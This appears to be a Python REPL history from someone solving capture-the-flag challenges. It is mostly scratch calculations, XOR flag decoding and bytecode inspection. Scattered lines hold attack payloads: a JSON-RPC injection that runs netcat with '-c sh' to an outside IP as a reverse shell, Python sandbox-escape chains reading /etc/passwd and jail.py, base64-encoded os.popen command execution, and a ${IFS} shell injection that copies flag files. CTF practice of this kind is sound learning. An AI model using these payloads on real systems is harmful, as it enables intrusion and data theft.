13*13
169 % 167
"A"*56
2**9
from pwn import *
k = b"\xF9V;YB\xDE\xF7A"
f1 = bytes([155, 57, 84, 45, 33, 191, 154, 49, 130, 57, 84, 41, 49, 129, 159, 36, 139, 51, 100, 56, 48, 187, 168, 47, 156, 33, 100, 63, 46, 191, 144, 50, 132])
xor(k,f1)
clear
a = 2
b = 2
c = a==b
c
chr(0x7f)
chr(0x7e)
chr(0x44)
import json
x = "{"id":8,"jsonrpc":"2.0","method":"Stream.RemoveStream","params":{"streamUri":"process:///bin/nc?name=oxnan5&params=-c sh 25.251.240.182 6724"}}"
x = '{"id":8,"jsonrpc":"2.0","method":"Stream.RemoveStream","params":{"streamUri":"process:///bin/nc?name=oxnan5&params=-c sh 25.251.240.182 6724"}}'
json.loads(x)
import json
x = '{"id":8,"jsonrpc":"2.0","method":"Stream.RemoveStream","params":{"id":"oxnan"}}'
json.loads(x)
ls
f = open("tess","w")
open("test","w").write((__import__("os").popen(__import__("base64").b64decode("{b64cmd}")).read()));
import base64
base64.b64encode("ls")
base64.b64encode(b"ls")
open("test","w").write((__import__("os").popen(__import__("base64").b64decode("bHM=")).read()));
open("test","w").write((__import__("os").popen(__import__("base64").b64decode("bHM=").decpde()).read()));
open("test","w").write((__import__("os").popen(__import__("base64").b64decode("bHM=").decode()).read()));
a = "{"id": 8, "jsonrpc": "2.0", "method": "Stream.AddStream", "params": {"streamUri": "process:///bin/python3?name=tmp&params="
a = """{"id": 8, "jsonrpc": "2.0", "method": "Stream.AddStream", "params": {"streamUri": "process:///bin/python3?name=tmp&params="""
a
len(a)
open("tmp").read("a")
open("tmp").read(1)
open("tmp").read(100)
open("tmp").read(None)
a='aaaaa'
a.hex()
a.encode().hex()
atext.encode('unicode_escape').decode()
text.encode('unicode_escape').decode()
a.encode('unicode_escape').decode()
a.encode('unicode_escape')
''.join([f'\\x{ord(c):02x}' for c in a])
''.join([f'\x{ord(c):02x}' for c in a])
''.join([f'\\x{ord(c):02x}' for c in a])
print(''.join([f'\\x{ord(c):02x}' for c in a]))
print(dir(__builtins__)
)
print(dir(__builtins__))
print(dir(__builtins__.__dict__))
print(__builtins__.__dict__)
print(__builtins__.__dict__["locals"])
print(dir(__builtins__.__dict__["locals"]))
print(dir(__builtins__.__dict__["locals"]()))
print(__builtins__.__dict__["locals"]())
def a():
   print 1
   print(1)
def a():
   print(1)
print(__builtins__.__dict__["locals"]())
print(dir(__builtins__.__dict__["locals"].__dict__))
print(dir(__builtins__.__dict__["locals"].__dir__))
print(type(__builtins__)
)
().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
dir(().__class__.__bases__[0])
dir(().__class__.__bases__[0].__subclasses__())
dir(().__class__.__bases__[0].__subclasses__()[40])
().__class__.__bases__[0].__subclasses__()[40]
().__class__.__bases__[0].__subclasses__()[40]()
().__class__.__bases__[0].__subclasses__()[40]
().__class__.__bases__[0].__subclasses__()
print(__builtins__['\x6f\x70\x65\x6e']("jail.py").read())0
print(__builtins__)
print(dir(__builtins__))
print(__builtins__.open())
print(__builtins__.__dict__["open")
print(__builtins__.__dict__["open"])
print('could have pwned')
exit()
a
import opcode
opcode.opname(160)
opcode.opname
opcode.opname[160]
import opcode
opcode.opname[0x53]
opcode.opname[0x83]
0x53
0x83
bytes.fromhex
type(chr.__class__.__base__)
type(chr.__class__.__base__())
type(chr.__class__.__base__.__subclasses)
type(chr.__class__.__bases__.__subclasses)
[<class 'type'>, <class 'async_generator'>, <class 'int'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class 'coroutine'>, <class 'dict_items'>, <class 'dict_itemiterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_keys'>, <class 'mappingproxy'>, <class 'dict_reverseitemiterator'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_values'>, <class 'dict'>, <class 'ellipsis'>, <class 'enumerate'>, <class 'float'>, <class 'frame'>, <class 'frozenset'>, <class 'function'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'instancemethod'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'list'>, <class 'longrange_iterator'>, <class 'member_descriptor'>, <class 'memoryview'>, <class 'method_descriptor'>, <class 'method'>, <class 'moduledef'>, <class 'module'>, <class 'odict_iterator'>, <class 'pickle.PickleBuffer'>, <class 'property'>, <class 'range_iterator'>, <class 'range'>, <class 'reversed'>, <class 'symtable entry'>, <class 'iterator'>, <class 'set_iterator'>, <class 'set'>, <class 'slice'>, <class 'staticmethod'>, <class 'stderrprinter'>, <class 'super'>, <class 'traceback'>, <class 'tuple_iterator'>, <class 'tuple'>, <class 'str_iterator'>, <class 'str'>, <class 'wrapper_descriptor'>, <class 'types.GenericAlias'>, <class 'anext_awaitable'>, <class 'async_generator_asend'>, <class 'async_generator_athrow'>, <class 'async_generator_wrapped_value'>, <class 'coroutine_wrapper'>, <class 'InterpreterID'>, <class 'managedbuffer'>, <class 'method-wrapper'>, <class 'types.SimpleNamespace'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'weakref.CallableProxyType'>, <class 'weakref.ProxyType'>, <class 'weakref.ReferenceType'>, <class 'types.UnionType'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class 'hamt'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'items'>, <class '_contextvars.Context'>, <class '_contextvars.ContextVar'>, <class '_contextvars.Token'>, <class 'Token.MISSING'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'ast.AST'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'collections.abc.Iterable'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class '_distutils_hack._TrivialRe'>, <class '_distutils_hack.DistutilsMetaFinder'>, <class '_distutils_hack.shim'>, <class 'types._C'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>][127]
a = [<class 'type'>, <class 'async_generator'>, <class 'int'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class 'coroutine'>, <class 'dict_items'>, <class 'dict_itemiterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_keys'>, <class 'mappingproxy'>, <class 'dict_reverseitemiterator'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_values'>, <class 'dict'>, <class 'ellipsis'>, <class 'enumerate'>, <class 'float'>, <class 'frame'>, <class 'frozenset'>, <class 'function'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'instancemethod'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'list'>, <class 'longrange_iterator'>, <class 'member_descriptor'>, <class 'memoryview'>, <class 'method_descriptor'>, <class 'method'>, <class 'moduledef'>, <class 'module'>, <class 'odict_iterator'>, <class 'pickle.PickleBuffer'>, <class 'property'>, <class 'range_iterator'>, <class 'range'>, <class 'reversed'>, <class 'symtable entry'>, <class 'iterator'>, <class 'set_iterator'>, <class 'set'>, <class 'slice'>, <class 'staticmethod'>, <class 'stderrprinter'>, <class 'super'>, <class 'traceback'>, <class 'tuple_iterator'>, <class 'tuple'>, <class 'str_iterator'>, <class 'str'>, <class 'wrapper_descriptor'>, <class 'types.GenericAlias'>, <class 'anext_awaitable'>, <class 'async_generator_asend'>, <class 'async_generator_athrow'>, <class 'async_generator_wrapped_value'>, <class 'coroutine_wrapper'>, <class 'InterpreterID'>, <class 'managedbuffer'>, <class 'method-wrapper'>, <class 'types.SimpleNamespace'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'weakref.CallableProxyType'>, <class 'weakref.ProxyType'>, <class 'weakref.ReferenceType'>, <class 'types.UnionType'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class 'hamt'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'items'>, <class '_contextvars.Context'>, <class '_contextvars.ContextVar'>, <class '_contextvars.Token'>, <class 'Token.MISSING'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'ast.AST'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'collections.abc.Iterable'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class '_distutils_hack._TrivialRe'>, <class '_distutils_hack.DistutilsMetaFinder'>, <class '_distutils_hack.shim'>, <class 'types._C'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>]
['type', 'async_generator', 'int', 'bytearray_iterator', 'bytearray', 'bytes_iterator', 'bytes', 'builtin_function_or_method', 'callable_iterator', 'PyCapsule', 'cell', 'classmethod_descriptor', 'classmethod', 'code', 'complex', 'coroutine', 'dict_items', 'dict_itemiterator', 'dict_keyiterator', 'dict_valueiterator', 'dict_keys', 'mappingproxy', 'dict_reverseitemiterator', 'dict_reversekeyiterator', 'dict_reversevalueiterator', 'dict_values', 'dict', 'ellipsis', 'enumerate', 'float', 'frame', 'frozenset', 'function', 'generator', 'getset_descriptor', 'instancemethod', 'list_iterator', 'list_reverseiterator', 'list', 'longrange_iterator', 'member_descriptor', 'memoryview', 'method_descriptor', 'method', 'moduledef', 'module', 'odict_iterator', 'pickle.PickleBuffer', 'property', 'range_iterator', 'range', 'reversed', 'symtable entry', 'iterator', 'set_iterator', 'set', 'slice', 'staticmethod', 'stderrprinter', 'super', 'traceback', 'tuple_iterator', 'tuple', 'str_iterator', 'str', 'wrapper_descriptor', 'types.GenericAlias', 'anext_awaitable', 'async_generator_asend', 'async_generator_athrow', 'async_generator_wrapped_value', 'coroutine_wrapper', 'InterpreterID', 'managedbuffer', 'method-wrapper', 'types.SimpleNamespace', 'NoneType', 'NotImplementedType', 'weakref.CallableProxyType', 'weakref.ProxyType', 'weakref.ReferenceType', 'types.UnionType', 'EncodingMap', 'fieldnameiterator', 'formatteriterator', 'BaseException', 'hamt', 'hamt_array_node', 'hamt_bitmap_node', 'hamt_collision_node', 'keys', 'values', 'items', '_contextvars.Context', '_contextvars.ContextVar', '_contextvars.Token', 'Token.MISSING', 'filter', 'map', 'zip', '_frozen_importlib._ModuleLock', '_frozen_importlib._DummyModuleLock', '_frozen_importlib._ModuleLockManager', '_frozen_importlib.ModuleSpec', '_frozen_importlib.BuiltinImporter', '_frozen_importlib.FrozenImporter', '_frozen_importlib._ImportLockContext', '_thread.lock', '_thread.RLock', '_thread._localdummy', '_thread._local', '_io._IOBase', '_io._BytesIOBuffer', '_io.IncrementalNewlineDecoder', 'posix.ScandirIterator', 'posix.DirEntry', '_frozen_importlib_external.WindowsRegistryFinder', '_frozen_importlib_external._LoaderBasics', '_frozen_importlib_external.FileLoader', '_frozen_importlib_external._NamespacePath', '_frozen_importlib_external._NamespaceLoader', '_frozen_importlib_external.PathFinder', '_frozen_importlib_external.FileFinder', 'ast.AST', 'codecs.Codec', 'codecs.IncrementalEncoder', 'codecs.IncrementalDecoder', 'codecs.StreamReaderWriter', 'codecs.StreamRecoder', '_abc._abc_data', 'abc.ABC', 'collections.abc.Hashable', 'collections.abc.Awaitable', 'collections.abc.AsyncIterable', 'collections.abc.Iterable', 'collections.abc.Sized', 'collections.abc.Container', 'collections.abc.Callable', 'os._wrap_close', '_sitebuiltins.Quitter', '_sitebuiltins._Printer', '_sitebuiltins._Helper', '_distutils_hack._TrivialRe', '_distutils_hack.DistutilsMetaFinder', '_distutils_hack.shim', 'types._C', 'types.DynamicClassAttribute', 'types._GeneratorWrapper']
a = ['type', 'async_generator', 'int', 'bytearray_iterator', 'bytearray', 'bytes_iterator', 'bytes', 'builtin_function_or_method', 'callable_iterator', 'PyCapsule', 'cell', 'classmethod_descriptor', 'classmethod', 'code', 'complex', 'coroutine', 'dict_items', 'dict_itemiterator', 'dict_keyiterator', 'dict_valueiterator', 'dict_keys', 'mappingproxy', 'dict_reverseitemiterator', 'dict_reversekeyiterator', 'dict_reversevalueiterator', 'dict_values', 'dict', 'ellipsis', 'enumerate', 'float', 'frame', 'frozenset', 'function', 'generator', 'getset_descriptor', 'instancemethod', 'list_iterator', 'list_reverseiterator', 'list', 'longrange_iterator', 'member_descriptor', 'memoryview', 'method_descriptor', 'method', 'moduledef', 'module', 'odict_iterator', 'pickle.PickleBuffer', 'property', 'range_iterator', 'range', 'reversed', 'symtable entry', 'iterator', 'set_iterator', 'set', 'slice', 'staticmethod', 'stderrprinter', 'super', 'traceback', 'tuple_iterator', 'tuple', 'str_iterator', 'str', 'wrapper_descriptor', 'types.GenericAlias', 'anext_awaitable', 'async_generator_asend', 'async_generator_athrow', 'async_generator_wrapped_value', 'coroutine_wrapper', 'InterpreterID', 'managedbuffer', 'method-wrapper', 'types.SimpleNamespace', 'NoneType', 'NotImplementedType', 'weakref.CallableProxyType', 'weakref.ProxyType', 'weakref.ReferenceType', 'types.UnionType', 'EncodingMap', 'fieldnameiterator', 'formatteriterator', 'BaseException', 'hamt', 'hamt_array_node', 'hamt_bitmap_node', 'hamt_collision_node', 'keys', 'values', 'items', '_contextvars.Context', '_contextvars.ContextVar', '_contextvars.Token', 'Token.MISSING', 'filter', 'map', 'zip', '_frozen_importlib._ModuleLock', '_frozen_importlib._DummyModuleLock', '_frozen_importlib._ModuleLockManager', '_frozen_importlib.ModuleSpec', '_frozen_importlib.BuiltinImporter', '_frozen_importlib.FrozenImporter', '_frozen_importlib._ImportLockContext', '_thread.lock', '_thread.RLock', '_thread._localdummy', '_thread._local', '_io._IOBase', '_io._BytesIOBuffer', '_io.IncrementalNewlineDecoder', 'posix.ScandirIterator', 'posix.DirEntry', '_frozen_importlib_external.WindowsRegistryFinder', '_frozen_importlib_external._LoaderBasics', '_frozen_importlib_external.FileLoader', '_frozen_importlib_external._NamespacePath', '_frozen_importlib_external._NamespaceLoader', '_frozen_importlib_external.PathFinder', '_frozen_importlib_external.FileFinder', 'ast.AST', 'codecs.Codec', 'codecs.IncrementalEncoder', 'codecs.IncrementalDecoder', 'codecs.StreamReaderWriter', 'codecs.StreamRecoder', '_abc._abc_data', 'abc.ABC', 'collections.abc.Hashable', 'collections.abc.Awaitable', 'collections.abc.AsyncIterable', 'collections.abc.Iterable', 'collections.abc.Sized', 'collections.abc.Container', 'collections.abc.Callable', 'os._wrap_close', '_sitebuiltins.Quitter', '_sitebuiltins._Printer', '_sitebuiltins._Helper', '_distutils_hack._TrivialRe', '_distutils_hack.DistutilsMetaFinder', '_distutils_hack.shim', 'types._C', 'types.DynamicClassAttribute', 'types._GeneratorWrapper']
a[127]
a[120]
for x in a:
for i,x in enumerate(a):
    print(f"{i=} {x=}")
ls
import dis
import opcode
a = ['type', 'async_generator', 'int', 'bytearray_iterator', 'bytearray', 'bytes_iterator', 'bytes', 'builtin_function_or_method', 'callable_iterator', 'PyCapsule', 'cell', 'classmethod_descriptor', 'classmethod', 'code', 'complex', 'coroutine', 'dict_items', 'dict_itemiterator', 'dict_keyiterator', 'dict_valueiterator', 'dict_keys', 'mappingproxy', 'dict_reverseitemiterator', 'dict_reversekeyiterator', 'dict_reversevalueiterator', 'dict_values', 'dict', 'ellipsis', 'enumerate', 'float', 'frame', 'frozenset', 'function', 'generator', 'getset_descriptor', 'instancemethod', 'list_iterator', 'list_reverseiterator', 'list', 'longrange_iterator', 'member_descriptor', 'memoryview', 'method_descriptor', 'method', 'moduledef', 'module', 'odict_iterator', 'pickle.PickleBuffer', 'property', 'range_iterator', 'range', 'reversed', 'symtable entry', 'iterator', 'set_iterator', 'set', 'slice', 'staticmethod', 'stderrprinter', 'super', 'traceback', 'tuple_iterator', 'tuple', 'str_iterator', 'str', 'wrapper_descriptor', 'types.GenericAlias', 'anext_awaitable', 'async_generator_asend', 'async_generator_athrow', 'async_generator_wrapped_value', 'coroutine_wrapper', 'InterpreterID', 'managedbuffer', 'method-wrapper', 'types.SimpleNamespace', 'NoneType', 'NotImplementedType', 'weakref.CallableProxyType', 'weakref.ProxyType', 'weakref.ReferenceType', 'types.UnionType', 'EncodingMap', 'fieldnameiterator', 'formatteriterator', 'BaseException', 'hamt', 'hamt_array_node', 'hamt_bitmap_node', 'hamt_collision_node', 'keys', 'values', 'items', '_contextvars.Context', '_contextvars.ContextVar', '_contextvars.Token', 'Token.MISSING', 'filter', 'map', 'zip', '_frozen_importlib._ModuleLock', '_frozen_importlib._DummyModuleLock', '_frozen_importlib._ModuleLockManager', '_frozen_importlib.ModuleSpec', '_frozen_importlib.BuiltinImporter', '_frozen_importlib.FrozenImporter', '_frozen_importlib._ImportLockContext', '_thread.lock', '_thread.RLock', '_thread._localdummy', '_thread._local', '_io._IOBase', '_io._BytesIOBuffer', '_io.IncrementalNewlineDecoder', 'posix.ScandirIterator', 'posix.DirEntry', '_frozen_importlib_external.WindowsRegistryFinder', '_frozen_importlib_external._LoaderBasics', '_frozen_importlib_external.FileLoader', '_frozen_importlib_external._NamespacePath', '_frozen_importlib_external._NamespaceLoader', '_frozen_importlib_external.PathFinder', '_frozen_importlib_external.FileFinder', 'ast.AST', 'codecs.Codec', 'codecs.IncrementalEncoder', 'codecs.IncrementalDecoder', 'codecs.StreamReaderWriter', 'codecs.StreamRecoder', '_abc._abc_data', 'abc.ABC', 'collections.abc.Hashable', 'collections.abc.Awaitable', 'collections.abc.AsyncIterable', 'collections.abc.Iterable', 'collections.abc.Sized', 'collections.abc.Container', 'collections.abc.Callable', 'os._wrap_close', '_sitebuiltins.Quitter', '_sitebuiltins._Printer', '_sitebuiltins._Helper', '_distutils_hack._TrivialRe', '_distutils_hack.DistutilsMetaFinder', '_distutils_hack.shim', 'types._C', 'types.DynamicClassAttribute', 'types._GeneratorWrapper']
dis.dis('a[138]')
compile('a[138]','','eval')
compile('a[138]','','eval').co_code
compile('a[138]','','eval').co_code.hex()
opcode.opname[0x19]
dir(1.__class__.__base__.__subclasses__)
dir(1.__class__.__base__.__subclasses__())
dir(chr.__class__.__base__.__subclasses__)
dir(chr.__class__.__init__
dis
import dis
chr.__class__.__base__.__subclass__()
chr.__class__.__base__.__subclasses__()
chr.__class__.__base__.__subclasses__()[137]
compile('chr.__class__.__base__.__subclasses__()[137]')
compile('chr.__class__.__base__.__subclasses__()[137]','','eval')
compile('chr.__class__.__base__.__subclasses__()[137]','','eval').co_code
compile('chr.__class__.__base__.__subclasses__()[137]','','eval').co_code.hex()
dis.dis(compile('chr.__class__.__base__.__subclasses__()[137]','','eval'))
dis.dis(compile('chr.__class__.__base__.__subclasses__()[137].__init__','','eval'))
chr(116)+chr(103)
chr(116)+chr(96)
chr(116)+chr(100)
chr(116)+chr(99)
chr(116)+chr(101)
chr(116)+chr(101)+[17]
chr(116)+chr(101)[17]
(chr(116)+chr(101))[0]
a = '64006400170064001700640002003e005300'
len(a)
2<<8
2 << 6
 3<<6
3<<6
3<<5
5<<3
5<<5
5<<4
10>>1
0x92aadf255212
import requests
requests.get("http://192.168.38.1/main.html")
res = requests.get("http://192.168.38.1/main.html")
res.text
import dis
ls
def main():
    a = 1
    a <<= 6
    ret chr(a)
    return chr(a)
def main():
    a = 1
    a <<= 6
    return chr(a)
main()
dis.dis(main)
dis.dis("chr(1<<6)"
)
dis.dis("bornhack")
0xFFFFAC ^ 1
0xFFFFAC ^ 0xFFFFb2
hex(0xFFFFAC ^ 0xFFFFb2)
1^ 0xFFFFAC ^ 0xFFFFb2
2^ 0xFFFFAC ^ 0xFFFFb2
3^ 0xFFFFAC ^ 0xFFFFb2
3 ^ 0xFFFFAC ^ 0xFFFFb2
a = bytes.fromhex("284829542c7b5e684b7455773e73847455733a5f48344e5f78314d687e7d")
a
for c in range(0,len(a),2):
    print(c)
for c in range(0,len(a),2):
a = bytes.fromhex("284829542c7b5e684b7455773e73847455733a5f48344e5f78314d687e7d")
a = [x for x in a]
a
for c in range(0,len(a),2):
    a[c] = a[c]^0xffffAc^0xffffb2
a
"".join([chr(x) for x in a])
a = bytes.fromhex("284829542c7b5e684b7455773e73847455733a5f48344e5f78314d687e7d")
a = [x for x in a]
for c in range(0,len(a),2):
    a[c] = a[c]^0xffffAc
    a[c] = a[c] ^ 0xffffffb2
a
a = bytes.fromhex("284829542c7b5e684b7455773e73847455733a5f48344e5f78314d687e7d")
a = [x for x in a]
for c in range(0,len(a),2):
    a[c] = a[c]^0xffffffAc
    a[c] = a[c] ^ 0xffffffb2
a
a = bytes.fromhex("2040214c24735660436c4d6f366b7c6c4d6b3257402c4657702945607675")
a = [x for x in a]
for c in range(0,len(a),2):
    a[c] = a[c] ^ 0xffffffb2
    a[c] = a[c] ^ 0xffffffAc
for i in range(len(a)):
    a[i] += 8
a
"".join([chr(x) for x in a])
for i in range(len(a)):
    a[i] -= 16
"".join([chr(x) for x in a])
for i in range(len(a)):
    a[i] += 8
a
"".join([chr(x) for x in a])
for i in range(len(a)):
    a[i] += 8
"".join([chr(x) for x in a])
for i in range(len(a)):
    a[i] += 8
"".join([chr(x) for x in a])
a = bytes.fromhex("2040214c24735660436c4d6f366b7c6c4d6b3257402c4657702945607675")
for c in range(0,len(a),2):
    a[c] = a[c] ^ 0xffffffb2
    a[c] = a[c] ^ 0xffffffAc
a = [x for x in a]
for c in range(0,len(a),2):
    a[c] = a[c] ^ 0xffffffb2
    a[c] = a[c] ^ 0xffffffAc
a
ord("B")
ord("B")-8
58 ^ ord(" ")
a = bytes.fromhex("2040214c24735660436c4d6f366b7c6c4d6b3257402c4657702945607675")
for c in range(0,len(a),2):
    a[c] = a[c] ^ 26
a = [x for x in a]
for c in range(0,len(a),2):
    a[c] = a[c] ^ 26
a
"ƈ".casefold()
0xC2A68ABA10A3195E26497131B4B0562155427BFDA828AE25787E890C014D31B4911D44A64EF4896A41A184087430CC4E21ED2932E24BBDCE9E78C2CE48670273C38AF92E8C22398E80C31BA9450AB0398A6A939582950F596CB4426B6A8F9ADB8AC4E30D02B3517E2459092052DCB8F70C08125AB9C2EE9C1FF8D20CB84F7C5EF9C36F4AACEB18AA511BED8169F5B25082A7D57ECF44904DEA9C3D6F273FA154309046129C9BE253A1AD6DBD0F205DF2A2CCEFE5B27CF939053FDF806C48350498BD22899CBD6DB97DBB52FCA0AB7A3B0EA62E861C1628F93E779BC021B5EAF1D91EA5385EED0C57C63E94940944CEA77CD55E3221F63FC0017FB146E1AF9067
 a= "<?= server_info() ?>"
a = "<?= server_info() ?>"
len(a)
a = "server_info()"
len(a)
fzf
aa
input
print("")
print("".encode())
print("🥪".encode())
print("🥪")
🥪 = "hackerman"
null
none
None
for i in range(40):
    print(1440/i)
    print(1440/i+1)
for i in range(1,40):
    print(1440/i)
ls
open
from ctypes import rand
from ctypes import srand
from ctypes import CDLL
libc = CDLL("libc.so.6")
now = int(floor(time.time()))
libc.srand(now)
print(libc.rand())
from ctypes import CDLL
libc = CDLL("libc.so.6")
now = int(floor(time.time()))
libc.srand(now)
print(libc.rand())
import ctypes
libc = ctypes.CDLL("libc.so.6")
libc.rand()
libc.rand(1)
libc.srand(1)
libc.rand(1)
libc.srand(1)
libc.rand(1)
libc.rand()
libc.srand(1)
libc.rand()
clear
def hello():
	print("test")
dir(hello)
hello.__code__
a - ().__class__.__mro__[-1].__subclasses__()[-2]('','',('flag',),('.'))
a = ().__class__.__mro__[-1].__subclasses__()[-2]('','',('flag',),('.'))
a = b'5j\x89~\x00\xda;\xdd\x0b\x89\xde\x81\xc1G\xd1\x9c\xe8\xaf\xe2\xa6\xd4\x90\xec`\xed:\xccO\x02C\x92}l\x8b\x8d*J\xb0\x05'iCe\xe3!;HT'
b"5j\x89~\x00\xda;\xdd\x0b\x89\xde\x81\xc1G\xd1\x9c\xe8\xaf\xe2\xa6\xd4\x90\xec`\xed:\xccO\x02C\x92}l\x8b\x8d*J\xb0\x05'iCe\xe3!;HT"
b"5j\x89~\x00\xda;\xdd\x0b\x89\xde\x81\xc1G\xd1\x9c\xe8\xaf\xe2\xa6\xd4\x90\xec`\xed:\xccO\x02C\x92}l\x8b\x8d*J\xb0\x05'iCe\xe3!;HT".hex()
ls
from md2pdf.core import md2pdf
md2pdf(pdf_file_path,
       md_content=None,
       md_file_path=None,
       css_file_path=None,
md2pdf("./md.pdf",md_content=f"# cat$\{IFS\}uploads/flag*.txt$\{IFS\}>>$\{IFS\}uploads/{ourfile}")
md2pdf("./md.pdf",md_content="# cat${IFS}uploads/flag*.txt${IFS}>>${IFS}uploads/{ourfile}")
md2pdf("./md.pdf",md_content="# cat${IFS}uploads/flag*.txt${IFS}>>${IFS}uploads/"+ourfile)
ourfile="dinmor"
md2pdf("./md.pdf",md_content="# cat${IFS}uploads/flag*.txt${IFS}>>${IFS}uploads/"+ourfile)
md2pdf("./md.pdf",md_content="cat${IFS}uploads/flag*.txt${IFS}>>${IFS}uploads/"+ourfile)
md2pdf("./md.pdf",md_content="<font size='1'>test</font>")
md2pdf("./md.pdf",md_content="<font size='2'>test</font>")
md2pdf("./md.pdf",md_content="<font size='20'>test</font>")
md2pdf("./md.pdf",md_content="<font size='230'>test</font>")
a ['\x35\x7c\x33\x7c\x30\x7c\x32\x7c\x31\x7c','\x71\x62\x4f\x6c\x48','\x4c\x6e\x49\x7a\x4f','\x6e\x6f\x74','\x5a\x47\x51\x6f\x72','\x69\x6e\x70\x75\x74','\x4e\x4f\x54','\x59\x6d\x71\x76\x4e','\x44\x45\x43','\x32\x39\x31\x39\x30\x55\x78\x58\x79\x66\x4b','\x6e\x6d\x48\x59\x76','\x73\x62\x62','\x61\x72\x72','\x65\x55\x41\x69\x46','\x43\x41\x4c\x4c','\x74\x46\x4d\x4f\x4f','\x69\x6e\x70\x75\x74\x44\x65\x76','\x49\x56\x50\x68\x6b','\x61\x64\x63','\x32\x34\x30\x38\x39\x31\x35\x66\x61\x44\x77\x49\x62','\x52\x45\x54','\x4a\x4c\x45','\x4e\x4f\x50','\x49\x62\x72\x61\x69\x6e','\x72\x65\x61\x64\x6c\x69\x6e\x65','\x63\x72\x79\x70\x74\x6f','\x32\x32\x44\x67\x52\x4b\x43\x71','\x58\x57\x4d\x44\x68','\x70\x75\x73\x68','\x66\x6c\x61\x67\x2e\x74\x78\x74','\x57\x55\x69\x71\x47','\x6d\x67\x4e\x6f\x4d','\x56\x65\x32\x53\x4f\x77\x36\x76\x51\x7a','\x4a\x5a\x65\x75\x50','\x68\x65\x78','\x49\x4e\x49\x54\x5f\x4d\x45\x4d','\x4d\x55\x4c','\x6b\x58\x59\x4d\x67','\x49\x7a\x6a\x30\x44\x41\x51\x63\x44\x